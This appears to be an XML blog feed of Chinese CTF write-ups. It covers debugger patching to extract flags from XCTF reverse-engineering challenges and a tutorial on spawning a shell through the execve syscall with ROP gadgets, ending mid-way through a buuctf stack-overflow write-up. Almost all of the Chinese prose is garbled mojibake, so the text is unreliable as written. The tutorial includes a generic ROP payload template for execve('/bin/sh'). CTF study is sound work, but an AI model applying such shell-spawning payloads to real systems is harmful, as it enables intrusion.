´è§£å¯ä»¥ä½†æ˜¯æ¯”è¾ƒéš¾ï¼Œè¦ä»å¤–é¢å®ç°åˆæ¯”è¾ƒè‹›åˆ»é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å¼€å¯åŠ¨è°ƒç„¶åç›´æ¥æ”¹eipæ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚</p><p>x32dbgæ‰“å¼€æŸ¥çœ‹å†…å­˜æ˜ å°„ï¼Œå‘ç°textbssçš„åŸºå€æ˜¯0x101000</p><p><img src="https://i.loli.net/2021/05/22/ezy8HXpV3x7nGq4.png" alt="xctf_game_2.png"></p><p>è€Œåœ¨IDAé‡Œï¼Œæ­¤æ®µçš„åŸºå€æ˜¯<code>0x401000</code></p><p>å¾ˆæ¸…æ¥šäº†ï¼Œä»–ä»¬ä¹‹é—´åç§»äº†<code>0x300000</code>çš„åœ°å€å¤§å°ï¼Œåœ¨IDAé‡Œé¢çš„æ‰€æœ‰åœ°å€å‡å»<code>0x300000</code>å°±å¯ä»¥å¾—åˆ°åœ¨<code>x32dbg</code>é‡Œçš„å¯¹åº”åœ°å€ã€‚ç„¶åæ³¨æ„æ”¹<code>eip</code>éµå¾ªçš„åŸåˆ™åº”è¯¥æ˜¯é¦–å…ˆä¿è¯æ ˆå°½é‡å¹³è¡¡ï¼Œå¹¶ä¸”ä¿®æ”¹çš„å¹…åº¦å°½é‡ä¸å¤§ã€‚æ ¹æ®è¿™ä¸ªåŸåˆ™ä»¥åŠ<code>x32dbg</code>ç»™æˆ‘ä»¬ç¨‹åºä¸€å¼€å§‹çš„æ–­ç‚¹ã€‚</p><p><img src="https://i.loli.net/2021/05/22/jwtIs7krZgyilfN.png" alt="xctf_game_3.png"></p><p>æˆ‘ä»¬æŠŠæ ˆé¡¶çš„å€¼ä¿®æ”¹æˆæˆ‘ä»¬è¦è·³è½¬çš„åœ°æ–¹ï¼Œå¹¶ä¸”å°†<code>eip</code>å‘ä¸‹è°ƒ3ä¸ªè¯­å¥ä¹‹åå°±èƒ½ç›´æ¥æ‰§è¡Œè¾“å‡º<code>flag</code>çš„è¯­å¥è€Œä¸ç”¨ç©å®ƒè®¾è®¡çš„ç ´æ¸¸æˆäº†ã€‚é¦–å…ˆé‚£ä¸ªå‡½æ•°åœ¨IDAé‡Œé¢çš„åœ°å€æ˜¯<code>0x457ab4</code>ï¼Œé‚£ä¹ˆåœ¨<code>x32dbg</code>é‡Œé¢è¿™ä¸ªåœ°å€å°±æ˜¯<code>0x157ab4</code>ã€‚æˆ‘ä»¬å…ˆæŠŠæ ˆé¡¶ä¿®æ”¹æˆè¿™ä¸ªï¼Œå†æŠŠ<code>eip</code>æ”¹æˆ <code>0x77661b78</code></p><p><img src="https://i.loli.net/2021/05/22/TicptYsPE9XRSl7.png" alt="xctf_game_4.png"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæˆ‘ä»¬ç ´åäº†å®ƒçš„æ ˆï¼Œå› æ­¤å°½é‡é¿å…å»æ‰§è¡Œé‚£äº›å‡½æ•°ï¼Œé‡åˆ°å°½é‡è·³è¿‡ã€‚</p><p><img src="https://i.loli.net/2021/05/22/wPlNWzIcQ7YsGxi.png" alt="xctf_game_5.png"></p><p>è¿™é‡Œæˆ‘ä»¬ä¸é€‰æ‹©æ‰§è¡Œ<code>printf</code>å‡½æ•°ï¼Œå› ä¸ºè¯•è¿‡å°±çŸ¥é“ç”±äºä¹‹å‰ç ´åäº†æ ˆå¸§ä¼šå¯¼è‡´ä¸å¯é¢„ä¼°çš„é”™è¯¯å‘ç”Ÿï¼Œæ­£ç¡®åšæ³•å°±æ˜¯æŠŠ<code>eip</code>æ”¹åˆ°<code>call</code>é‚£ä¸ªä¹‹åã€‚</p><p>å…¶å®ç›´æ¥æ”¹<code>eip</code>ä¹Ÿä¸€æ ·çš„ï¼Œæˆ‘é‚£ç§åªæ˜¯æ”¹çš„å…¶ä¸­ä¸€ç§æ–¹å¼ã€‚</p><p>ç„¶åä¸‹é¢è¿˜æœ‰ä¸€ä¸ª<code>prinf</code>å‡½æ•°æˆ‘ä»¬ä¹Ÿé€‰æ‹©ä¸æ‰§è¡Œï¼Œåœ¨<code>printf</code>ä¹‹å‰ä¸‹ä¸ªæ–­ç‚¹ç„¶åF9è¿è¡Œä½ å°±å¯ä»¥çœ‹åˆ°<code>flag</code>äº†ã€‚</p><p><img src="https://i.loli.net/2021/05/23/j9QYM6TUN3KeGuo.png" alt="xctf_game_6.png"></p><p>ç„¶åè¿”å›æ¸¸æˆä¸€çœ‹ï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œä½†æ˜¯æˆ‘å·²ç»çŸ¥é“äº†<code>flag</code>ï¼Œhhhã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">flag:zsctf&#123;T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t&#125;</span><br></pre></td></tr></table></figure><h2 id="xctf-csaw2013reversing2"><a href="#xctf-csaw2013reversing2" class="headerlink" title="xctf-csaw2013reversing2"></a><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5081&page=1">xctf-csaw2013reversing2</a></h2><p>é¢˜ç›®å·²ç»è¯´äº†è¿è¡Œå°±å¯ä»¥æ‹¿<code>flag</code>ï¼Œä½†æ˜¯è¿è¡Œå‘ç°å¼¹å‡ºæ¥çš„çª—å£æ˜¯ä¹±ç ï¼ŒIDAåæ±‡ç¼–å¹¶ä¸”åç¼–è¯‘ä¹‹åæ£€æŸ¥<code>main</code>å‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line"></span><br><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ecx</span><br><span class="line">  CHAR *lpMem; // [esp+8h] [ebp-Ch]</span><br><span class="line">  HANDLE hHeap; // [esp+10h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  hHeap = HeapCreate(0x40000u, 0, 0);</span><br><span class="line">  lpMem = (CHAR *)HeapAlloc(hHeap, 8u, SourceSize + 1);</span><br><span class="line">  memcpy_s(lpMem, SourceSize, &amp;unk_409B10, SourceSize);</span><br><span class="line">  if ( !sub_40102A() &amp;&amp; !IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(0, lpMem + 1, &quot;Flag&quot;, 2u);</span><br><span class="line">    HeapFree(hHeap, 0, lpMem);</span><br><span class="line">    HeapDestroy(hHeap);</span><br><span class="line">    ExitProcess(0);</span><br><span class="line">  &#125;</span><br><span class="line">  __debugbreak();</span><br><span class="line">  sub_401000(v3 + 4, lpMem);</span><br><span class="line">  ExitProcess(0xFFFFFFFF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿå¤ªç‹—äº†ï¼Œè¿˜ä¼šæ£€æµ‹åœ¨ä¸åœ¨è°ƒè¯•å™¨ä¸­ï¼Œåœ¨çš„è¯æˆ‘è¿˜ç´¢æ€§ä¸è¾“å‡ºäº†ï¼Ÿ</p><p>è·Ÿè¿›å»<code>0x41000</code>å‡½æ•°å»çœ‹å‘ç°æœ‰å¯¹<code>msgbox</code>è¾“å‡ºçš„<code>flag</code>åšäº†ç‚¹æ‰‹è„šï¼Œé‚£ä¹ˆå°±çŒœæµ‹å¯èƒ½è¿™ä¸ªéƒ¨åˆ†æ˜¯ç”¨æ¥ç®—æ­£ç¡®çš„<code>flag</code>çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„é¡ºåºåº”è¯¥æ˜¯å…ˆæ‰§è¡Œé‚£ä¸ªå‡½æ•°å†è¾“å‡º<code>flag</code>æ‰å¯¹ã€‚æ‰€ä»¥ä¸€å¼€å§‹æˆ‘ä»¬æ”¹<code>eip</code>æ‰§è¡Œ<code>0x41000</code>å‡½æ•°ã€‚</p><p>ç›´æ¥æ”¹äº†<code>eip</code>å‘ç°å¹¶ä¸å¥½ä½¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å†<code>main</code>å‡½æ•°é‡Œé¢ç›´æ¥è°ƒç”¨<code>main</code>å‡½æ•°çš„ä»£ç äº†ã€‚å‘ç°è¿˜æ˜¯ä¸è¡Œä¹‹åï¼Œå‘ç°<code>int3</code>æŒ‡ä»¤ä¸€ç›´å†é˜»æŒ¡ï¼Œå› æ­¤æŠŠè¿™ä¸ªæŒ‡ä»¤<code>nop</code>æ‰ã€‚å‘ç°å¯ä»¥ç›´æ¥æ‰§è¡Œé‚£ä¸ªå‡½æ•°ï¼Œæ‰§è¡Œå®Œäº†ä¹‹åå‘ç°è¿˜æ˜¯è¦é€€å‡ºç¨‹åºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å¯»æ‰¾è¾“å‡ºè¿™ä¸ª<code>flag</code>çš„å‡½æ•°ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸èƒ½åƒä¸Šé¢é‚£ä¸ªé¢˜é‚£æ ·ï¼Œç›´æ¥èƒ½çœ‹åˆ°å˜é‡çš„å€¼ï¼Ÿ</p><p>é—®å¾—å¥½ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“qwqï¼Œåªèƒ½åœ¨çº¿å¯»å¸ˆå‚…è§£å†³è¿™ä¸ªç–‘é—®äº†ã€‚</p><p><img src="https://i.loli.net/2021/05/23/8C1M7fQv6yUPJwt.png" alt="xctf_csaw2013reversing2_1.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™è¾¹åˆä¸¤ä¸ªè°ƒç”¨messageboxå‡½æ•°ï¼Œé‚£ä¹ˆåˆ°åº•é€‰æ‹©å“ªä¸€ä¸ªï¼Œå›å¤´çœ‹ä»£ç é‡Œå°±ä¼šå‘ç°å’±ä»¬çš„messageboxä¼ äº†å››ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå¯¹æ¯”ä¸€ä¸‹å‘ç°ä¸‹é¢çš„messageboxæ‰æ˜¯ä¼ äº†å››ä¸ªå‚æ•°çš„å‡½æ•°è°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠeipæ”¹åˆ°ä¼ å‚é‚£è¾¹ï¼Œè¿è¡Œæ‰§è¡Œè·³å‡ºæ¶ˆæ¯æ¡†å¾—åˆ°flag</p><p><img src="https://i.loli.net/2021/05/23/uRpS1YtevmHThi8.png" alt="xctf_csaw2013reversing2_2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">flagï¼šflag&#123;reversing_is_not_that_hard!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç³»ç»Ÿè°ƒç”¨</title>
      <link href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><code>today</code>æ–°çš„çŸ¥è¯†åˆå¢é•¿äº†ï¼Œå‘ç°äº†<code>getshell</code>çš„å¦ä¸€ç§æ–¹å¼ï¼š<code>syscall</code>å’Œ<code>srop</code>ã€‚æ•…äº‹è¿˜è¦æºäºâ€¦(æ­¤å¤„çœç•¥ä¸‡å­—è¾“å‡º)</p><span id="more"></span><p>(note:æœ¬ä½œè€…è¿™æ¬¡æœ‰ç‚¹æ‡’ï¼Œæ²¡æœ‰å†™AT&amp;Tæ±‡ç¼–ï¼Œè€Œæ˜¯ä¸€å¾‹ç”¨äº†intelæ±‡ç¼–ï¼Œè¯·æ‚‰çŸ¥)</p><p>å¯èƒ½æ˜¯ä¹‹å‰æ±‡ç¼–åŸºç¡€ä¸å¤ªå¥½å§ï¼Œç«Ÿæ²¡æœ‰å‘ç°<code>syscall</code>è¿™ä¹ˆå¥½ç”¨çš„æŒ‡ä»¤ï¼Œåªè¦å†æŠŠ<code>/bin/sh</code>ä¼ å‚å°±èƒ½ç›´æ¥æ‰“å¼€ä¸€ä¸ªshellï¼ŒçœŸæ˜¯å¦™è›™ã€‚ä½†æ˜¯åœ¨ç³»ç»Ÿè°ƒç”¨ä¹‹å‰è¦åšå¾ˆå¤šçš„äº‹æƒ…ï¼Œè¯¸å¦‚å„ç±»å‚æ•°ä¼ é€’ï¼Œä»¥64ä½çš„æ¥è¯´ï¼Œæˆ‘ä»¬è¦å…ˆçŸ¥é“æˆ‘ä»¬è¦æ‰§è¡Œçš„å‡½æ•°ç³»ç»Ÿè°ƒç”¨å·ä¸º59ã€‚æˆ‘ä¹Ÿæ˜¯ç¿»è¿‡<code>libc</code>åº“çš„ï¼Œå‘ç°<code>system</code>å‡½æ•°å®ç°é‡Œé¢æœ‰ä¸€æ®µç«Ÿç„¶æ˜¯ç›´æ¥æ‰§è¡Œ<code>execve(&quot;/bin/sh&quot;)</code></p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><p>å®å±æ„å¤–äº†ï¼Œè¿™æ˜¯åœ¨æˆ‘æœ‰æ¬¡åæ±‡ç¼–<code>libc</code>åº“çš„æ—¶å€™å‘ç°çš„ï¼Œæˆ‘åŸæ¥ä¸€ç›´æ˜¯åªç”¨<code>system</code>å‡½æ•°<code>getshell</code>çš„ï¼Œæ²¡æƒ³åˆ°<code>system</code>å†…éƒ¨æ˜¯é€šè¿‡è¿™æ ·çš„ç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€<code>shell</code>çš„ã€‚</p><p>é‚£è¿™å¾—å­¦å•Šï¼Œè¿™æ˜¯åŸºç¡€çš„åŸºç¡€å•Šã€‚</p><p>è¿™è¾¹ç»™å‡ºä¸€ä¸‹64ä½Linuxçš„å„ä¸ªç³»ç»Ÿè°ƒç”¨å·ï¼Œè¿™ä¸ªåœ¨Linuxçš„<code>/usr/include/asm/unistd.h </code>ä¸‹æœ‰ï¼Œæˆ‘è¿™é‡Œæˆªå–éƒ¨åˆ†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill 62</span></span><br></pre></td></tr></table></figure><p>emmï¼Œç»è¿‡å¤šæ–¹å–è¯å‘¢ï¼Œå‘ç°æ‰“å¼€shellä¸ä»…è¦ç»™ç¬¬ä¸€ä¸ªå‚æ•°ä¼ ä¸Š<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œç¬¬äºŒç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²éƒ½éœ€è¦ç½®é›¶ã€‚64ä½å‘¢å‰å…­ä¸ªå‚æ•°æ˜¯ä¾æ¬¡ç»™<code>rdi,rsi,rdx,rcx,r8,r9</code>è¿™å…­ä¸ªå¯„å­˜å™¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¼ å‚è¿‡ç¨‹å°±æ¯”è¾ƒè‰°éš¾ï¼Œæ³¨å…¥ä»£ç é¦–å…ˆè‚¯å®šä¸ç°å®ï¼Œç°åœ¨é¢˜ç›®åŸºæœ¬éƒ½æ˜¯NXä¿æŠ¤çš„æŒºåˆ°ä½çš„ã€‚æ‰€ä»¥è¦å»ç¨‹åºé‡Œé¢å¯»æ‰¾<code>gadget</code>ï¼Œç”±äº<code>pop %rbx</code>è¿™ä¸ª<code>gadget</code>å·¨éš¾æ‰¾ï¼Œåœ¨å®é™…åº”ç”¨è¦æ‡‚å¾—å˜é€šï¼Œæ¯”å¦‚å…ˆç»™ä¸€ä¸ªå¯„å­˜å™¨æˆ‘æƒ³è¦çš„å€¼ç„¶åå†<code>mov</code>ç»™<code>rdx</code>ï¼Œæœ‰ä¸€æ ·çš„æ•ˆæœã€‚</p><p>ç”±æ­¤å°±è¡ç”Ÿå‡ºæ¥ä¸€ä¸ª<code>return to __libc_csu_init</code>ç®€ç§°<code>ret2csu</code>çš„æ–¹æ³•æ¥ï¼Œå…¶å®è¿™ä¸ªæˆ‘ä¸ªäººè®¤ä¸ºæ²¡æœ‰å¿…è¦å•ç‹¬æ‹¿å‡ºæ¥è®²ï¼Œå› ä¸ºå°±æ˜¯å› ä¸ºè¿™ä¸ªç‰¹æ®Šçš„å‡½æ•°åŸºæœ¬è•´å«äº†å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦çš„<code>gadget</code>æ‰ä¼šè¢«å¦‚æ­¤ä¼ å”±çš„ï¼Œä¼šäº†åŸºæœ¬çš„<code>rop</code>æ”»å‡»å°±è¡Œï¼Œ<code>ret2csu</code>çš„åŸç†è·Ÿè¿™ä¸ªå°±ä¸€æ¨¡ä¸€æ ·ã€‚</p><p>ä¸€èˆ¬çš„payloadå°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fill_data+fake_rbp+(mov rax,<span class="number">59</span>)+pop_rdi+bin_sh_addr+pop_rsi+<span class="number">0</span>+pop_rdx+<span class="number">0</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€èˆ¬çš„payloadï¼Œå¦‚æœæ‰¾ä¸åˆ°å¯¹åº”çš„gadgetï¼Œå¯ä»¥è‡ªå·±é€‚å½“å˜é€šã€‚</p><h2 id="buuctf-ciscn-s-3"><a href="#buuctf-ciscn-s-3" class="headerlink" title="buuctf:ciscn_s_3"></a><a href="https://buuoj.cn/challenges#ciscn_2019_s_3">buuctf:ciscn_s_3</a></h2><h3 id="åˆ†æç¨‹åº"><a href="#åˆ†æç¨‹åº" class="headerlink" title="åˆ†æç¨‹åº"></a>åˆ†æç¨‹åº</h3><p>64ä½æ— å£³çš„elfç¨‹åºï¼Œæ‰”è¿›<code>IDA</code>ç«Ÿå‘ç°<code>plt</code>è¡¨åªæœ‰å¯æ€œçš„ä¸¤é¡¹ï¼Œå¹¶ä¸”å®ç”¨æ€§ä¹Ÿä¸å¤§çš„é‚£ç§ã€‚åœ¨ä¸€èˆ¬çš„<code>ret2libc</code>ä¸­æˆ‘ä»¬ä¸€èˆ¬é€šè¿‡ä¸€ä¸ªè¾“å‡ºå‡½æ•°<code>(puts,write,printf)</code>æ¥æ³„éœ²åœ°å€ï¼Œç„¶è€Œè¿™é‡Œæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„è¾“å‡ºå‡½æ•°ï¼Œå¦‚æœä½ æƒ³æ¨¡ä»¿ä¸‹é¢è¾“å‡ºä¸€ä¸ª<code>plt</code>è¡¨é¡¹å†…å®¹ä¹Ÿå¯ä»¥ï¼Œä¸æ‹¦ä½ ï¼Œåªæ˜¯ä½ è´¹å°½å¿ƒæ€ç”¨ç³»ç»Ÿè°ƒç”¨çš„<code>puts</code>æˆ–è€…<code>write</code>ä¸ºä½•ä¸ç›´æ¥ç”¨<code>execve</code>ç›´æ¥<code>getshell</code>å‘¢ï¼Ÿæ‰€ä»¥æˆ‘ä»¬å°±ç¡®å®šæˆ‘ä»¬é‡‡ç”¨<code>syscall</code>çš„æ–¹å¼å»<code>getshell</code>ã€‚</p><h3 id="å¯»æ‰¾æ¼æ´"><a href="#å¯»æ‰¾æ¼æ´" class="headerlink" title="å¯»æ‰¾æ¼æ´"></a>å¯»æ‰¾æ¼æ´</h3><p>è¿™ä¸€ä¸ªå¯ä»¥è¯´å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´äº†ï¼Œ<code>read</code> <code>0x400</code>å­—èŠ‚çš„æ•°æ®ï¼Œä¸”ç¼“å†²åŒºç‰¹åˆ«å°ã€‚</p><h3 id="ç¬¬ä¸€æ¬¡æº¢å‡º"><a href="#ç¬¬ä¸€æ¬¡æº¢å‡º" class="headerlink" title="ç¬¬ä¸€æ¬¡æº¢å‡º"></a>ç¬¬ä¸€æ¬¡æº¢å‡º</h3><p>ç”±äºç¨‹åºå¹¶æœªç›´æ¥æä¾›<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬è¦é è‡ªå·±ï¼Œç„¶åæœ€åå¡«ä¸Šä¸€ä¸ª<code>main</code>å®ç°äºŒæ¬¡æº¢å‡ºï¼Œç¬¬ä¸€æ¬¡å†™<code>/bin/sh</code>ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œ<code>execve(&quot;/bin/sh&quot;)</code>ã€‚</p><hr><p>è¿™é‡Œæå‡ºä¸€ç‚¹æˆ‘è‡ªå·±çš„çœ‹æ³•ï¼Œæˆ‘è®¤ä¸ºè¿™ä¸ªé¢˜ç›®æœ‰ç‚¹é—®é¢˜ï¼Œvlunå‡½æ•°å¾ˆå¯èƒ½å­˜åœ¨æ ˆä¸å¹³è¡¡çš„æƒ…å†µï¼Œç†ç”±æœ‰ä¸¤ç‚¹</p><p>1.ç¨‹åºæ­£å¸¸æ‰§è¡Œ(æ— æº¢å‡º)æ— æ³•æ­£å¸¸ç»“æŸ</p><p>2.ç»™<code>24</code>å­—èŠ‚å¤§å°çš„æ•°æ®å¯ä»¥ç›´æ¥è¦†ç›–<code>rip</code>ï¼Œå› ä¸ºæˆ‘çš„ç†è§£æ˜¯ç¼“å†²åŒºå¤§å°<code>16</code>å­—èŠ‚å†åŠ ä¸Šä¸€ä¸ª<code>rbp 8</code>å­—èŠ‚åº”è¯¥<code>24</code>ä¸ªå­—èŠ‚æ‰åˆšåˆšè¦†ç›–åˆ°<code>rbp</code>çš„ä½ç½®ï¼Œè€Œæ— 